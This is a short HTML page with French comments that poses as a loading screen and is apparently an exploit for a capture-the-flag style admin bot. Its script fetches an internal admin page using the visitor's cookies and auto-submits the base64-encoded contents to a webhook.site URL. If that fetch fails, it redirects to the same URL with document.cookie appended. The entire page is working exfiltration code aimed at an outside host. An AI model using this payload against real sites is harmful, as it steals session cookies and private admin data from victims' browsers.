<!DOCTYPE html>
<html>
<body>
    <h1>Chargement en cours...</h1>
    <form id="exploitForm" action="https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010" method="POST">
        <input type="hidden" name="admin_content" id="admin_content">
    </form>

    <script>
        // On essaie de récupérer la page admin
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "http://192.168.132.208:9223/admin", true);
        xhr.withCredentials = true; // Très important pour envoyer les cookies du bot
        
        xhr.onload = function() {
            // On met le code source de l'admin dans le formulaire
            document.getElementById('admin_content').value = btoa(xhr.responseText);
            // On envoie le formulaire automatiquement vers ton webhook
            document.getElementById('exploitForm').submit();
        };

        xhr.onerror = function() {
            // Si le GET échoue (CORS), on tente une redirection directe avec le cookie
            location.href = "https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010?cookie=" + document.cookie;
        };

        xhr.send();
    </script>
</body>
</html>
